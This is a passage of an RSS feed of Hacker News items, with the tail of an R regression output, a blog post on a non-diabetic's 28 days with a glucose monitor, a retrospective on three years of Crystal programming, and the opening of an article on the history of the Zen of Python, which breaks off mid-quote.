## (Intercept) -0.09522    0.25647  -0.371    0.712
## x           -0.08718    0.25907  -0.337    0.738
## 
## Residual standard error: 1.814 on 48 degrees of freedom
## Multiple R-squared:  0.002354,   Adjusted R-squared:  -0.01843 
## F-statistic: 0.1132 on 1 and 48 DF,  p-value: 0.738
## 
## 
## Call:
## lm(formula = ‚Ä¶</code></pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lindeloev.github.io/tests-as-linear/">https://lindeloev.github.io/tests-as-linear/</a></em></p>]]>
            </description>
            <link>https://lindeloev.github.io/tests-as-linear/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121457</guid>
            <pubDate>Sat, 13 Feb 2021 04:43:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a person without diabetes learned from 28 days with a glucose monitor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26121447">thread link</a>) | @jseliger
<br/>
February 12, 2021 | https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor | <a href="https://web.archive.org/web/*/https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="header"></header><main id="main"><section id="content-articles" data-ani-anchor="onload"></section><section id="blog-single-content" data-ani-anchor=""><div><div><p>After scary bouts of hypoglycemia as a kid, Blake Reichmann thought he had a solid low-sugar diet. Then a CGM taught him where he could do better.</p></div><div><div><div><div data-bg="/wp-content/uploads/2020/10/bessi-profile.png"> <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/09b375d3b3a726e5e6486b60cc17de94?s=32&amp;d=mm&amp;f=y&amp;r=g"></div></div></div></div><div id="featured-image-single-v"> <img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" aria-label="The CGM Challenge: What a person without diabetes learned from 28 days with a continuous glucose monitor"></div><div id="single-content-content"><div><p><span>I never thought I‚Äôd have a tiny probe stuck in my arm for 28 days. I‚Äôm not diabetic or even prediabetic. But when I stumbled on the chance to wear a continuous glucose monitor (CGM) as part of a challenge partnered with Levels, I jumped on it. I‚Äôve been conscious of blood sugar my whole life because I suffered from spells of hypoglycemia as a child.</span></p><p><span>Hypoglycemia is when your blood sugar drops below 70mg/dL. I still don‚Äôt know why it happened, but it wasn‚Äôt fun. When my glucose levels dropped too low, I‚Äôd experience cold sweats, lightheadedness, trembling hands, and an elevated heart rate. These symptoms were likely the result of my body releasing epinephrine (adrenaline) to stabilize my blood glucose.</span></p><p><span>Over the years, I started to pick up on which foods caused my blood sugar to crash. The biggest culprits were cereal for breakfast and sweet tea later in the day. Every time I ate a big bowl of cereal before school (usually Frosted Mini-Wheats or Honey Nut Cheerios), I would crash around 10:30 a.m. like clockwork. Sometimes the crashes were so bad that I thought I might pass out, so I‚Äôd call my mom to check me out of school.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" alt="" width="200" height="200" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w" data-sizes="(max-width: 200px) 100vw, 200px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w"></p><p><span>Experiencing low blood sugar not only made it hard to focus but was, quite frankly, a scary experience for someone who didn‚Äôt understand what was going on. After missing a few classes from these episodes, my mom decided it was time to change my diet.</span></p><p><span>I went from eating cereal in the mornings to eggs, bacon, and fruit (berries or avocado) and cut out the sweet tea (tough to do for a boy raised in Alabama). Once I made those changes, the crashes stopped, and I had energy throughout the day.</span></p><p><span>At the time, I didn‚Äôt fully understand why the switch worked, but I did understand even at a young age that consuming a bunch of carbs and sugar wasn‚Äôt good for me. Since then, I‚Äôve become fascinated with maintaining a healthy lifestyle and finding ways to improve my health. My curiosity for seeking ways to optimize my diet is what eventually led me to put a CGM on my arm.</span></p><h2>The Challenge</h2><p><span>I first learned about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span> from following </span><a href="https://twitter.com/jwmares"><span>Justin Mares</span></a><span> on Twitter. I‚Äôve followed Justin for quite a while since he knew a lot about the health-and-wellness space after founding two health food companies, </span><a href="https://www.kettleandfire.com/"><span>Kettle &amp; Fire</span></a><span> and </span><a href="https://perfectketo.com/"><span>Perfect Keto</span></a><span>.</span></p><p><span>In October, Justin shared an </span><a href="https://twitter.com/jwmares/status/1315696415213936641"><span>interesting tweet</span></a><span> about a weight-loss challenge that only required participants to track their blood glucose with a </span><a href="https://www.levelshealth.com/"><span>Levels</span></a><span> CGM. After reading the tweet, I knew this was something I had to try. Even though the challenge focused on weight loss, I enrolled immediately because I wanted to experiment with a CGM to see how my body reacts to my diet.</span></p><p><span>The challenge required me to keep my glucose levels below 120mg/dL even after a meal. For every day I went over, I‚Äôd lose $25 (talk about having skin in the game). The challenge started with a three-day grace period, so I could experiment with my diet to see how it impacted my glucose without getting penalized.</span></p><p><span>(For context, according to the</span><a href="https://www.idf.org/component/attachments/attachments.html?id=728&amp;task=download"> <span>International Diabetes Federation (IDF) guidelines</span></a><span>, your glucose values are ‚Äúnormal‚Äù if they stay below 140mg/dL after meals and return to pre-meal levels within two to three hours. Since this is a challenge geared towards weight loss, the upper limit was set slightly lower.)</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/what-should-my-glucose-levels-be-ultimate-guide"><b>What should your glucose levels be? Here‚Äôs the ultimate guide to healthy blood sugar ranges</b></a></p><p><span>To help stay in the target range, each member of the challenge had access to a WhatsApp group chat to support each other. The group chat was a place for members to share what diet was working well, vent their frustrations when they failed, and provide a positive environment for motivation and encouragement. This aspect was less useful for me (I ended up muting it after a few days) because my goals were different. Still, I could see how much other members appreciated the accountability and support.</span></p><h2>What I Learned</h2><p><span>Overall, I found the challenge to be a learning experience filled with joyful moments of self-confirmation, times of utter disappointment, and a few surprises in between.</span></p><h3>The Good</h3><p><span>The best news was discovering that my typical breakfast of three eggs, bacon, and half an avocado drizzled in olive oil caused almost no glycemic response, nor did my afternoon snack of raw almonds. The app showed that these foods consistently hit a perfect score. Since I eat these foods most often, it was comforting knowing that I had a strong foundation.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" alt="" width="400" height="600" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w" data-sizes="(max-width: 400px) 100vw, 400px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w"></p><p><span>The challenge also confirmed my belief that eating a low-carb paleo/keto-inspired diet consisting of mostly meat, vegetables, and healthy fats (olive oil, coconut oil, and butter/ghee) was optimal for maintaining consistent glucose levels.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w"></p><p><span>Over the past four years, I‚Äôve made a conscious effort to cook meals that avoid simple carbs, vegetable oils, and sweeteners, and it felt really good knowing I‚Äôd been making the right choices.</span></p><h3>The Not-So-Good</h3><p><span>The foods with the most considerable impact on my blood sugar were white rice and craft beer, although I can‚Äôt say I was surprised. Unfortunately, I love both of these things (so long Chipotle burrito bowls). It was disappointing to finally have to stare down the truth instead of continuing to live in willful ignorance.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w"></p><p><span>I was also disappointed to learn how much sweet potato spikes my blood sugar. I knew sweet potatoes had a lower </span><a href="https://www.health.harvard.edu/diseases-and-conditions/glycemic-index-and-glycemic-load-for-100-foods"><span>glycemic index (GI)</span></a><span> than regular potatoes, but they still pushed me over the limit. I plan to keep them in my diet but will be more conscious about how often I eat them.</span></p><h3>The Surprising</h3><p><span>The biggest surprise of the challenge was discovering that quality tequila (G4 Reposado) had almost no effect on my blood sugar. Tequila that is 100% agave has zero carbs because of the distillation process (an average craft IPA has around 13g of carbs). Since beer is my usual go-to if I want a drink, I was happy to learn there was a healthier substitute I already enjoyed.</span></p><p><span>I also recognize I need to be careful here. Just because I didn‚Äôt experience a glucose spike doesn‚Äôt mean I didn‚Äôt have a biological response. </span><a href="https://academic.oup.com/ajcn/article/85/6/1545/4632987"><span>Research suggests</span></a><span> that alcohol decreases the liver‚Äôs ability to make new glucose, so it can trigger hypoglycemia, especially if you‚Äôre fasting or in a ketogenic state.</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/alcohol-and-metabolic-fitness"><b>What does alcohol do to my glucose levels?</b></a></p><p><span>Another big surprise was discovering that my glucose levels aren‚Äôt just impacted by <em>what</em> I eat but also <em>when</em> I eat. I confirmed this because I meal prep twice a week to save time by eating the same meal multiple days in a row. (You may find that boring; I find it efficient.)</span></p><p><span>Eating the same thing for lunch and dinner on several challenge days was great for understanding how my body responds to food at different times of the day. All else being equal, my glucose spikes more after dinner than it does for lunch‚Äîsometimes by as much as 20mg/dL!</span></p><p><span>Even more surprising was noticing how little change there was from eating the same meal from day to day, but then having a large variance between lunch and dinner. I‚Äôm sure there‚Äôs a reason why, but I couldn‚Äôt tease a convincing explanation out of the data.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w"></p><h2>What‚Äôs Changed</h2><p><span>Since the challenge ended, I‚Äôve made a few adjustments to my diet. I‚Äôm not one to make radical changes (like cutting out a particular food from my diet forever), but now I‚Äôm more careful when I still want to splurge. Here are some of the changes I‚Äôve made:</span></p><ul><li aria-level="1"><span>If I‚Äôm going to drink, I opt for quality spirits (neat or on the rocks) over craft beer or cocktails loaded with sugar.</span></li><li aria-level="1"><span>I‚Äôve reconsidered the idea of a cheat day. I still plan on enjoying the occasional night of pizza and beer or tacos and margaritas, but a cheat day isn‚Äôt just a day. Now that I‚Äôm aware that the effects of an unhealthy meal can last for 2-3 days, I better make sure that the meal is worth it.</span></li><li aria-level="1"><span>I need to avoid any sweetened beverage, no matter how ‚Äúhealthy.‚Äù&nbsp; Smoothies, sweetened kombucha, and sweetened coffee wrecked my glucose levels, even though they‚Äôre often touted as healthy choices. Better to eat my sweets after a hearty meal than to drink them.</span></li><li aria-level="1"><span>I‚Äôm now more conscious of what I order when I eat out. For example, I opt for the salad at Chipotle instead of the burrito bowl. I‚Äôve also switched to eating more sashimi instead of sushi to avoid eating as much rice.</span></li></ul><p><span>Even though the challenge only lasted 28 days, I learned more about my diet and lifestyle in those four weeks than I had from any previous blood test or book on dieting. The challenge confirmed that I already eat a healthy diet, but I need to make a few changes to ensure a healthy life for decades to come.</span></p><p><em><span>To learn more about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span><a href="https://www.wearablechallenge.com/">, click here</a>.</span></em></p><p><em>Adapted from an original post <a href="https://lawsonblake.com/continuous-glucose-monitoring-levels-health/">here</a>.&nbsp;</em></p></div></div></div></section><section id="blog-single-content-related" data-ani-anchor=""></section></main>         </div>]]>
            </description>
            <link>https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121447</guid>
            <pubDate>Sat, 13 Feb 2021 04:41:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 years of Crystal Lang programming: The good, the bad, the ugly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26120995">thread link</a>) | @iomcr
<br/>
February 12, 2021 | https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly | <a href="https://web.archive.org/web/*/https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><img src="https://crystal-lang.org/assets/media/crystal_logo.svg" alt="Crystal Logo"></p>
<p>It's been more than three years since I've been hooked into Crystal Lang. For
those who don't know, Crystal promises to be able to write high-level code,
borrowing syntax from Ruby while adding strongly-typed yet inferred parameters
and avoiding the null exception problem. It also provides a complete and powerful <em>stdlib</em> and uses concepts from new generation languages like Go Lang. </p>
<p>Oh, and a powerful on-compile time macro system making runtime reflection obsolete! </p>
<p>Did it fulfill its promises? Yes. At some costs.</p>
<p>I started developing in Crystal Lang out of curiosity and pleasure, as I thought
this is a fun language to work with. 
Then I challenged myself to see what I was able to write, and it ended up with <em><a target="_blank" href="https://github.com/anykeyh/clear">Clear</a></em>, an ORM I've built from scratch.</p>
<p>Eventually, I started working on a booking platform. Getting free hands on the technical side, I decided to design the backend in Crystal. </p>
<p>Nine months later and an app finished, I can give some insight about using Crystal in a professional environment; the <strong>good</strong>, the <strong>bad</strong>, and the <strong>ugly</strong>, and how to develop an app in a language that is still considered confidential and in a pre-release state.</p>
<h2 id="the-good">The good</h2>
<p>Crystal kept its promise in being a very expressive language. It allowed me to
write clean high-level business code, allowing to lower the gap between clients
requirement and code syntax. Big <em>oui</em> here!</p>
<pre><code>
post <span>"/contact_us"</span> <span>do</span> <span>|env|</span>
  form = ContactUsForm.from_json(env.request.body.not_nil!)
  Mail.deliver ContactUsEmail.new(form.email, form.title, form.message)
<span>end</span>
</code></pre>
<p>The customer had some very complex rules when bookings were moved or canceled,
and I was aware that two teams of developers had given up on this project prior
to my work. </p>
<p>I decided to go for a Controller‚Ää-‚ÄäBusiness Logic‚Ää-‚ÄäModel 3-tier on
the backend and keep the View and Presentation on the frontend (using Typescript
and MithrilJS). </p>
<p>Because Crystal is strongly typed, the work to be done on spec
and coverage of the code is strongly reduced, in comparison to a Ruby or Python
code. </p>
<p>80% of the bugs occurring in those script languages have their root cause
laying in lose parameter type or nullable type. Both cases are covered at
compile time in Crystal. Basically, I wrote only 120 test cases on this
application, covering the different business cases of the user. In Ruby, for an
application of this scale, I would be around 250 to 400 tests.</p>
<p>At release, the application faced very few bugs. 
Some edges case we forgot with the client were failing. But so far, the compiler did an excellent job in preventing most of the bugs. </p>
<p>Because the language is compiled, it is wonderful to use within a Kubernetes cluster: The app starts in less than 200ms, allowing horizontal scaling, health-check and automatic restart of the app much more convenient than a big Rails application. </p>
<p>Memory usage is relatively low, peeking to ~250Mb and I never experienced any memory leak whatsoever. </p>
<p>And it runs fast. Really fast. For those who used to work with Rails, Django, or Laravel,
we are comparing snails with a cheetah there. </p>
<p>Actually, it runs so fast that I decided to do some complex data aggregation and transformation directly in Crystal instead of PostgreSQL.</p>
<h2 id="the-bad">The bad</h2>
<p>The major challenge I faced in keeping a good pace and being productive was the
compilation time. It takes around 20 seconds to compile/run spec on my i7 8750H.
We are talking of an app with ~9000 LOC, few shards (library), for a grand total
of probably less than 100k LOC. This compilation time is mostly due to the very
dynamic nature of Crystal lang, the work needed to be done at
compile-time‚Ää (<em>‚Äämacro and type inference being the culprits‚Ää</em>)‚Ää, and the lack of
incremental compilation at the time of writing this article. 20 seconds seems
not much, but during a whole working day, it builds-up leading to a
non-negligible loss of productivity. For the defense of the language, the
problem is also at the developer level: it is just enough to lose focus, browse
few tabs on Reddit, check a video on Youtube, and can‚Ää-‚Äätoo often!‚Ää-‚Ää snowball
to minutes or more. Guilty I am!</p>
<p>Another challenge was the usage of the young library ecosystem. The language is
still confidential and some shards‚Ää (the name which is given to libraries in the Crystal
world)‚Ääare not working with the latest version of Crystal, or lack of support,
as some authors just gave up on the language or have little to no time to
maintain them. 
I can't complain, as I am too responsible for this, as I gave little maintenance the last months over <a target="_blank" href="https://github.com/anykeyh/clear">Clear ORM</a>.</p>
<h2 id="the-ugly">The ugly?</h2>
<p>During development, I faced a few but worrying bugs, where the compiler was
literally crashing without any idea of where the problem came from. It also
happens that using some complex features of the language, like inheriting from
generic classes could lead to segfault during execution after a while. Issues
were raised and the Crystal Lang team fixed everything on short notice.</p>
<p>Since now, I'm not able to build the backend using <code>--release</code> flag due to
segfault at compile time. 
This is not a problem <em>per se</em>, as even without the optimization, the backend spends like 90% of its time waiting for PostgreSQL. </p>
<p>I still get a random crash of the application I gave up fixing for now.
Basically, the app can't access anymore to the PostgreSQL database after a
while.
This occurs on average between 3 to 30 days of running; I defined an
<code>/healthcheck</code> endpoint throwing a simple <code>SELECT 1</code>; to check the connection, called each second by Kubernetes.</p>
<p>With multiple pods redundancy, and thanks to low
memory foot-print and quick start-up time, pods defaulted got evicted and
recreated in a matter of seconds.</p>
<h2 id="conclusion">Conclusion</h2>
<p><strong>If I did this app using Rails, would have I been more productive?</strong></p>
<p>It's hard to say, as I spent quite a lot of time debugging, improving, and
maintaining Clear ORM within the scope of this project. I think the
productivity difference would have been negligible.</p>
<p>What you would win by having a strict compiler avoiding your hours of debugging 
and specs definition, you lose by the compile-time, the need to rewrite some 
basic functionality you could get via gems. </p>
<p><strong>Would I recommend people using Crystal?</strong></p>
<p>Yes, if:</p>
<ul>
<li>You are aware that something might break, as the ecosystem is still young.</li>
</ul>
<p>Avoiding monolithic application patterns will certainly reduce the compile-time
problems. Having micro-service architecture is a must-have if you want to
develop with Crystal, as each service will take much less time to compile, test
and deploy. </p>
<p>The low memory footprint and fast execution time fit perfectly with
this architecture. If you come from the Ruby world, you will feel at ease with
the syntax but will have to learn new design patterns of face issues with
compile-time or overly complex macro/code.
A common mistake is to try to use open hash, JSON, or collection to realize too late that strongly typed language doesn't like open structures</p>
<p><strong>Compared to Go Lang or Rust, how do Crystal fits?</strong> </p>
<p>Go Lang is very dull and <em>feels</em> austere in my opinion. It's not a bad
technology, but it feels not enough magical for my personal taste.
Rust is great but it remains less elegant to write business code with it. 
The magic Rust does with the memory still adds a burden in terms of readability,
with reference, lifecycle, and other symbols polluting the essence of the code
in my opinion. </p>
<p>Knowing that the Crystal Lang team is aware of most of the
problems above and working hard to release the v1.0 of the language, I'm
confident the language will know a bright future and all the traction it merits.</p>
</div></div>]]>
            </description>
            <link>https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120995</guid>
            <pubDate>Sat, 13 Feb 2021 02:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Zen of Python: A Most in Depth Article]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120869">thread link</a>) | @lumpa
<br/>
February 12, 2021 | https://www.pythonkitchen.com/zen-of-python-in-depth/ | <a href="https://web.archive.org/web/*/https://www.pythonkitchen.com/zen-of-python-in-depth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>Note: <em>I wrote a quite complete article on the Zen but for some reason it went down in seo history. I am tired seeing people write ‚Äòin-depth‚Äô article with commentaries from the top of their head and materials they pulled out of their pockets. I‚Äôm publishing the article in here.  The commentary part is built from the sayings of Brett Cannon, Guido, Chris Angelico, Nick Coghlan, Raymond Hettinger &amp; co. Warning: read only if you are a fan of Python. Last notes: I do hope learners will get a great glimpse of how the Zen can help them structure their code and give them better insight and foresight. It‚Äôs a documentation  of how practically the Zen is applied in Python decisions.</em></p>
<h2>Table of contents</h2>
<ul>
<li>Birth of the Path</li>
<li>Zen, Strunk and White</li>
<li>Master Tim Showers his Blessings</li>
<li>Authentic Commentary</li>
</ul>
<p>The Zen of Python saw light for the first time in 1999. It‚Äôs one of the many aspects that adds to the awesomeness of Python. It‚Äôs a set of expressions which corners the spirit of the language. It was enounced by Tim Peters, a reputable software engineer, master Pythonista and Python‚Äôs ‚Äòmost prolific and tenacious core developer‚Äô in the words of none other than Guido [18]. This article bases itself mostly on the saying of core devs and highly reputable members. It makes a great gift to all those interested in the history of the sysadmin script which took the world by (pleasent) surprise.</p>
<p><img src="https://images.unsplash.com/photo-1598545343242-89b4c263a343?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The way the Zen came about was unique. It was a reflection from the unknown Patrick Phalen about the Python feel [1]:</p>
<blockquote><p>
  ‚Ä¶ the more I use<br>
  and learn about the language, the more I find myself appreciating the<br>
  nice balance and heft Guido gave to it. Yet there doesn‚Äôt seem to be a<br>
  single document that sums up that ‚Äúaesthetic,‚Äù but rather it<br>
  tends to appear piecemeal, over time, mostly in the Wisdom of Chairman Tim.
</p></blockquote>
<p>It was a call to infuse the Python spirit into aliens from Perl Land and beyond. It requested some 10 to 20 lines which sums up the Python view</p>
<blockquote><p>
  Would both Guido and TIm Peters be willing to collaborate on a short<br>
  paper ‚Äî call it ‚ÄúThe Python Way‚Äù for lack of a better title ‚Äî which<br>
  sets out the 10-20 prescriptives they might offer to those who come to<br>
  Python from other languages and immediately want to find a way to bend<br>
  it into uncomfortable positions ‚Äî (implement closures, etc.).
</p></blockquote>
<p>It was a request to prevent Pythonistas from falling into the error of campaigning for changing the language. It advocated for imbuing yourself with the language‚Äôs flow and change your ways and views instead of the other way round. In the original mail, it quoted Fredrik Lundh as saying ‚Äúsure looks like the ‚Äòcommunity‚Äô thinks that changing the<br>
language is more important that using it‚Ä¶‚Äù [5]. Patrick clarifies:</p>
<blockquote><p>
  What I have in mind is sort of a very brief Strunk-&amp;-White-like<br>
  ‚ÄúElements of Style‚Äù for Python, which suggests fundamental idiomatic<br>
  recommendations for operating within the spirit of the language. A<br>
  distillation of Python Zen is what I‚Äôm talking about ‚Äî something to go<br>
  off and contemplate when the ‚Äúfix Python now‚Äù decibels become a bit<br>
  much.
</p></blockquote>
<p><img src="https://images.unsplash.com/photo-1555573989-14a9017746c3?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=749&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The Zen school lays out hints and guidelines. You understand by your own exercise and by the company of someone seasoned in the craft</p>
<blockquote><p>
  it de-emphasizes mere knowledge of sutras and doctrine and favors direct understanding through spiritual practice and interaction with an accomplished teacher or Master.[2]
</p></blockquote>
<p>The Zen was a request to help Python people achieve the Python state of mind so that your code resonates well with the structure behind, conveying in the process the associated beauty, elegance and finesse. Those guidelines if well impregnated would make your code revered whithin the circle of true monks.</p>
<p>But, curiously enough, Tim tells [19]:</p>
<blockquote><p>
  If I were to change anything, I‚Äôd drop the reference to ‚ÄúZen‚Äù.  That wasn‚Äôt<br>
  part of the original, and was added by someone else.
</p></blockquote>
<p>In other words, the title is not from the author [23]</p>
<p>Strunk &amp; White is the name of two people, viz William Strunk and Elwyn Brooks White. Strunk wrote <em>The Elements of Style</em>, acclaimed by the Times as one of the most influencial books since 1923 [3]. White who was Strunk‚Äôs student and reviser after the professor‚Äôs death describes the book as:</p>
<blockquote><p>
  a forty-three page summation of the case<br>
  for cleanliness, accuracy, and brevity in the use of English [4]
</p></blockquote>
<p>The effect of the book is described below, he being Strunk:</p>
<blockquote><p>
  he omitted so<br>
  many needless words, and omitted them so forcibly and with such eagerness and obvious<br>
  relish, that he often seemed in the position of having shortchanged himself ‚Äî a man left<br>
  with nothing more to say yet with time to fill, a radio prophet who had out-distanced the<br>
  clock. Will Strunk got out of this predicament by a simple trick: he uttered every sentence<br>
  three times
</p></blockquote>
<p>One effect of applying the Zen would then also be lighter code files.</p>
<p><img src="https://images.unsplash.com/photo-1484108678824-e6543e2e4230?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=752&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>Master Tim heard the plea, approved the demand and responded accordingly [6]</p>
<blockquote><p>
  Clearly a job for Guido alone ‚Äî although I doubt it‚Äôs one he‚Äôll take on<br>
  (fwiw, I wish he would too!).  Here‚Äôs the outline he would start from,<br>
  though <wink>:
</wink></p></blockquote>
<pre><code>Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
Unless explicitly silenced.
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
Although that way may not be obvious at first unless you're Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it's a bad idea.
If the implementation is easy to explain, it may be a good idea.
Namespaces are one honking great idea -- let's do more of those!
</code></pre>
<p>The 20th was left for Guido to fill in:</p>
<blockquote><p>
  There you go:  20 Pythonic Fec^H^H^HTheses on the nose, counting the one I‚Äôm<br>
  leaving for Guido to fill in.
</p></blockquote>
<p>Venerable Tim shares exactly how the lines came about [15]:</p>
<blockquote><p>
  It was a throwaway python-list post. But like all great triumphs of literature, it was written during commercials breaks while watching professional wrestling on TV, and munching on a ham sandwich. All true!
</p></blockquote>
<p>Yet, the author is emphatical: It‚Äôs complete and more than meets the demand [6]:</p>
<blockquote><p>
  If the answer to <em>any</em> Python design issue<br>
  isn‚Äôt obvious after reading those ‚Äî well, I just give up <wink>.
</wink></p></blockquote>
<p>The above also reveals the purpose of the Zen: To address design issues. And it‚Äôs not a simple matter. Guido says [18]:</p>
<blockquote><p>
  In many ways, the design philosophy I used when creating Python is probably one of the main reasons for its ultimate success.
</p></blockquote>
<p>The Zen only gives the outlines, in contrast to Strunk and White which gives explanations and examples in addition. Thus the need for commentaries. These help the non-initiated without being a replacement for the company of the bright minds.</p>
<p>In a time of fluctuating and steered standards, the reference in the actual PEP8 document to Strunk and White in the usage of the English language caused a bitter, ugly and messy thread [7]. It caused some of the best people of the community to forego following  python-list [8], a casual reminder that being too open without limit hurts.</p>
<p><img src="https://images.unsplash.com/photo-1593297372323-2ba78409d0b1?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The Zen has become an important piece of the Python programming language. If you don‚Äôt know the Zen, you won‚Äôt strike the right chord to communicate with the community. Raymond Hettinger advises:</p>
<blockquote><p>
